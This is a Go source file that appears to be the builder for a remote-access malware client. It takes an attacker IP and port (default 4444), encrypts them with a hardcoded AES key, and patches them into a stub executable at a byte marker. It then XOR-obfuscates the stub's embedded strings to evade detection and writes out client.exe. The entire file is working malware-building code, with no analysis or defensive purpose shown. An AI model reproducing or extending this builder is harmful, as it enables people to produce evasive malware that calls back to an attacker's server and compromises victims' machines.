package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"debug/pe"
	"encoding/binary"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"os"
	"time"
)

const (
	ConfigKey = "B4A7E9C2D5F8A1B3C6E9D2F5A8B1C4D7"
	ConfigIV  = "A1B2C3D4E5F6A7B8"
)

var marker = []byte{0xDE, 0xAD, 0xBE, 0xEF, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x99, 0xAA, 0xBB, 0xCC}

type Config struct {
	IP   string `json:"ip"`
	Port int    `json:"port"`
}

func main() {
	ip := flag.String("ip", "127.0.0.1", "Server IP address")
	port := flag.Int("port", 4444, "Server Port")
	flag.Parse()

	// Handle positional arguments for "go run builder.go <ip> <port>"
	args := flag.Args()
	if len(args) >= 1 {
		*ip = args[0]
	}
	if len(args) >= 2 {
		fmt.Sscanf(args[1], "%d", port)
	}

	fmt.Printf("[+] Building client for %s:%d\n", *ip, *port)

	stubPath := "stub.exe"
	if _, err := os.Stat(stubPath); os.IsNotExist(err) {
		// Try client/client_c.exe if stub.exe doesn't exist
		stubPath = "client/client_c.exe"
		if _, err := os.Stat(stubPath); os.IsNotExist(err) {
			log.Fatalf("[-] Error: stub.exe (or client/client_c.exe) not found. Please compile the client first.")
		}
	}

	data, err := ioutil.ReadFile(stubPath)
	if err != nil {
		log.Fatalf("[-] Error reading stub: %v", err)
	}

	// Find all occurrences of the marker
	var indices []int
	searchData := data
	offset := 0
	for {
		idx := bytes.Index(searchData, marker)
		if idx == -1 {
			break
		}
		indices = append(indices, offset+idx)
		searchData = searchData[idx+1:]
		offset += idx + 1
	}

	if len(indices) == 0 {
		log.Fatalf("[-] Error: Marker not found in stub binary.")
	}

	targetIndex := -1
	if len(indices) == 1 {
		targetIndex = indices[0]
	} else {
		fmt.Printf("[*] Multiple markers found (%d). Searching for the resource placeholder...\n", len(indices))
		maxZeros := -1
		for _, idx := range indices {
			if idx+len(marker)+2032 > len(data) {
				continue
			}
			// Count zeros in the following 2032 bytes
			zeros := 0
			for i := 0; i < 2032; i++ {
				if data[idx+len(marker)+i] == 0 {
					zeros++
				}
			}
			if zeros > maxZeros {
				maxZeros = zeros
				targetIndex = idx
			}
		}
	}

	if targetIndex == -1 {
		log.Fatalf("[-] Error: Could not identify the correct configuration placeholder.")
	}

	config := Config{
		IP:   *ip,
		Port: *port,
	}

	configBytes, err := json.Marshal(config)
	if err != nil {
		log.Fatalf("[-] Error marshalling config: %v", err)
	}

	encryptedConfig := encrypt(configBytes)
	if len(encryptedConfig) > 2032 {
		log.Fatalf("[-] Error: Encrypted config is too large (%d bytes, max 2032).", len(encryptedConfig))
	}

	// Pad with zeros to 2032
	finalPayload := make([]byte, 2032)
	copy(finalPayload, encryptedConfig)

	// Patch data
	patchedData := make([]byte, len(data))
	copy(patchedData, data)
	copy(patchedData[targetIndex+len(marker):], finalPayload)

	// --- Automated Obfuscation Logic ---
	rand.Seed(time.Now().UnixNano())
	xorKey := byte(rand.Intn(254) + 1)

	// 1. Find and patch XOR key
	xorKeyMarker := []byte{0xAA, 0xBB, 0xCC, 0xDD}
	keyIdx := bytes.Index(patchedData, xorKeyMarker)
	if keyIdx != -1 {
		patchedData[keyIdx+4] = xorKey
		fmt.Printf("[+] Patched XOR key: 0x%02X\n", xorKey)
	}

	// 2. Detect strings and build string table
	type StringEntry struct {
		RVA    uint32
		Length uint32
	}
	var stringTable []StringEntry

	f, err := pe.Open(stubPath)
	if err == nil {
		defer f.Close()

		var importRVA uint32
		var importSize uint32

		if oh64, ok := f.OptionalHeader.(*pe.OptionalHeader64); ok {
			importRVA = oh64.DataDirectory[1].VirtualAddress
			importSize = oh64.DataDirectory[1].Size
		} else if oh32, ok := f.OptionalHeader.(*pe.OptionalHeader32); ok {
			importRVA = oh32.DataDirectory[1].VirtualAddress
			importSize = oh32.DataDirectory[1].Size
		}

		for _, sec := range f.Sections {
			// Only scan data sections
			if sec.Name == ".rdata" || sec.Name == ".data" {
				fmt.Printf("[*] Scanning section %s for strings...\n", sec.Name)
				start := sec.Offset
				end := sec.Offset + sec.Size
				if end > uint32(len(patchedData)) {
					end = uint32(len(patchedData))
				}

				sectionData := patchedData[start:end]
				for i := 0; i < len(sectionData); {
					// Heuristic: printable characters, length >= 4, null terminated
					if isPrintable(sectionData[i]) {
						j := i
						for j < len(sectionData) && isPrintable(sectionData[j]) {
							j++
						}
						length := j - i
						if length >= 4 && j < len(sectionData) && sectionData[j] == 0 {
							// Found a potential string
							rva := sec.VirtualAddress + uint32(i)

							// Skip if it is in the Import Table
							if rva >= importRVA && rva < importRVA+importSize {
								i = j + 1
								continue
							}

							// Avoid obfuscating the markers themselves
							isMarker := false
							if bytes.Contains(sectionData[i:j], marker) || bytes.Contains(sectionData[i:j], xorKeyMarker) {
								isMarker = true
							}

							if !isMarker {
								stringTable = append(stringTable, StringEntry{
									RVA:    rva,
									Length: uint32(length),
								})
								// XOR the string in patchedData
								for k := 0; k < length; k++ {
									patchedData[start+uint32(i)+uint32(k)] ^= xorKey
								}
							}
							i = j + 1
						} else {
							i++
						}
					} else {
						i++
					}
				}
			}
		}
	}

	fmt.Printf("[+] Detected and obfuscated %d strings\n", len(stringTable))

	// 3. Store string table in the configuration resource
	// Resource layout: [Marker(16)][EncryptedConfig(2032)][NumStrings(4)][StringTableEntries...]
	// We need to write this after the 2032 bytes of encrypted config
	tableOffset := targetIndex + len(marker) + 2032
	if tableOffset+4+len(stringTable)*8 <= len(patchedData) {
		binary.LittleEndian.PutUint32(patchedData[tableOffset:tableOffset+4], uint32(len(stringTable)))
		for i, entry := range stringTable {
			entryOffset := tableOffset + 4 + i*8
			binary.LittleEndian.PutUint32(patchedData[entryOffset:entryOffset+4], entry.RVA)
			binary.LittleEndian.PutUint32(patchedData[entryOffset+4:entryOffset+8], entry.Length)
		}
	} else {
		fmt.Printf("[-] Warning: String table too large for remaining space in binary.\n")
	}

	err = ioutil.WriteFile("client.exe", patchedData, 0755)
	if err != nil {
		log.Fatalf("[-] Error writing client.exe: %v", err)
	}

	fmt.Println("[+] Successfully built client.exe")
}

func isPrintable(b byte) bool {
	return b >= 32 && b <= 126
}

func encrypt(plaintext []byte) []byte {
	block, err := aes.NewCipher([]byte(ConfigKey))
	if err != nil {
		log.Fatalf("[-] AES error: %v", err)
	}

	// No padding requested by client (using fixed size buffer)
	// But we need to handle block size for CBC
	padding := aes.BlockSize - (len(plaintext) % aes.BlockSize)
	if padding == 0 {
		padding = aes.BlockSize
	}
	padtext := bytes.Repeat([]byte{0}, padding) // Zero padding for simplicity in C
	plaintext = append(plaintext, padtext...)

	ciphertext := make([]byte, len(plaintext))
	mode := cipher.NewCBCEncrypter(block, []byte(ConfigIV))
	mode.CryptBlocks(ciphertext, plaintext)

	return ciphertext
}
